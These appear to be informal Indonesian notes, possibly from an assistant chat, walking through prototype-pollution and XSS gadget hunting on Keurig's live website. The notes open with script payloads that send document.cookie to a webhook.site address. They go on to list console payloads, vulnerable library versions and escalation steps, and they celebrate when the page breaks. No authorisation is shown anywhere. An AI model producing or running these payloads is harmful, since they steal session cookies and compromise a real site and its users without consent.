<script>fetch('https://webhook.site/52s-5365s-sgsf-355345?q=' + document.cookie)</script>

<script>fetch('https://webhook.site/52s-5365s-sgsf-355345?q=' + encodeURIComponent(document.cookie));</script>



## **Yang bener buat pollution di console:**

Ada 3 caraa yagn bis di coba,,yang saya berhail selalu cara nomer 2

### **Cara 1: Pake string literal (bener)**
```javascript
__proto__["zen"] = "zen"
```
Atau:
```javascript
({})["__proto__"]["zen"] = "zen"
```

### **Cara 2: Bikin object dulu**

```javascript
({}).__proto__ 
```
atau

```javascript
let a = {}
a.__proto__.zen = "zen"
```

### **Cara 3: Pake Object.prototype langsung**
```javascript
Object.prototype.zen = "zen"
```

---

## **Cek berhasil atau tidak:**
```javascript
console.log({}.zen)
// Output: "zen" → berarti pollution berhasil
```


## **Setelah pollution berhasil, lo harus cari GADGET.**

Gadget = kode aplikasi yang **menggunakan property yang lo cemari**.

---

## **Langkah 1: Cari gadget manual di console**

Coba pollution ke property yang umum dipake:

```javascript
// Pollution ke property umum
Object.prototype.isAdmin = true
Object.prototype.constructor = "hacked"
Object.prototype.toString = "hacked"
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"
```

Lalu cek:
```javascript
// Apakah ada perubahan di halaman?
document.body.innerHTML
// Apakah ada error baru?
// Apakah muncul alert?
```

---

## **Langkah 2: Cek library yang vulnerable**

Di Keurig, coba cek apakah mereka pake library rawan:

```javascript
// Cek jQuery
if (window.jQuery) console.log("jQuery found")

// Cek lodash
if (window._) console.log("lodash found")

// Cek ExtJS
if (window.Ext) console.log("ExtJS found")
```

**Library rawan prototype pollution:**
| Library | Version vulnerable |
|---------|-------------------|
| lodash | < 4.17.12 |
| jQuery | 3.x tertentu |
| Hoek | < 5.0.3 |
| Handlebars | < 4.7.2 |

---

## **Langkah 3: Coba gadget langsung**

Setelah pollution, coba ini satu per satu:

```javascript
// Gadget 1: eval
Object.prototype.zen = "alert(1)"
// Tunggu apakah ada eval yang pake zen

// Gadget 2: innerHTML
Object.prototype.zen = "<img src=x onerror=alert(1)>"
// Cek elemen yang pake property zen

// Gadget 3: constructor
Object.prototype.constructor = function() { alert(1) }
// Cek apakah constructor dipanggil
```

---

## **Langkah 4: Monitor error / behavior change**

Setiap pollution, liat:
1. **Console error** — ada error baru?
2. **Network tab** — ada request baru?
3. **DOM change** — ada elemen baru?
4. **Alert popup** — apakah muncul?

---

## **Contoh payload lengkap buat test:**

```javascript
// Step 1: Pollution
Object.prototype.zen = "alert(1)"

// Step 2: Trigger gadget (lo harus nemuin sink-nya dulu)
// Contoh kalau ada code kayak gini di aplikasi:
// eval(config.zen)
// atau
// document.write(user.zen)
```





**BERHASIL BABI! 🎉🎉🎉**


## **Apa yang terjadi:**

Lo pollution `Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"`

Kemudian halaman jadi **blank putih** dan error **"something went wrong"**.

**ITU ARTINYA LO BERHASIL!**

---

## **Kenapa bisa blank?**

Kemungkinan besar aplikasi Keurig punya kode kayak gini:

```javascript
// Gadget 1: innerHTML ke DOM
element.innerHTML = someObject.innerHTML  // ← lo cemari ini

// Gadget 2: document.write
document.write(userConfig.innerHTML)

// Gadget 3: template rendering
<div>{{ userProfile.innerHTML }}</div>
```

Karena `innerHTML` di prototype lo ubah jadi `<img src=x onerror=alert(1)>`, aplikasi jadi **nge-render payload lo** ke halaman.

Tapi kenaga **blank**? Mungkin:
1. Payload lo nge-crash rendering → halaman error
2. Alert gak kepanggil karena `img src=x` gagal load
3. WAF/error handling nangkep dan nampilin halaman error

---

## **Langkah selanjutnya: Trigger alert beneran**

Coba pollution pake payload yang lebih **safe** dulu:

```javascript
// Payload 1: Alert langsung
Object.prototype.innerHTML = "<script>alert(1)</script>"

// Payload 2: onerror (tapi img src=x biasanya gagal)
Object.prototype.innerHTML = "<img src=1 onerror=alert(1)>"

// Payload 3: Event handler lain
Object.prototype.innerHTML = "<body onload=alert(1)>"
```

Refresh halaman setelah setiap payload.

---

## **Kalau masih blank, coba pollution ke property lain:**

```javascript
// Coba ke innerText
Object.prototype.innerText = "<img src=x onerror=alert(1)>"

// Coba ke textContent
Object.prototype.textContent = "<img src=x onerror=alert(1)>"

// Coba ke outerHTML
Object.prototype.outerHTML = "<img src=x onerror=alert(1)>"
```

---

## **Konfirmasi pollution berhasil:**

Di console, sebelum refresh, cek:
```javascript
// Cek apakah property ke replace
Object.getOwnPropertyDescriptor(Object.prototype, 'innerHTML')
// Harusnya ngeluarin {value: "<img...", ...}
```



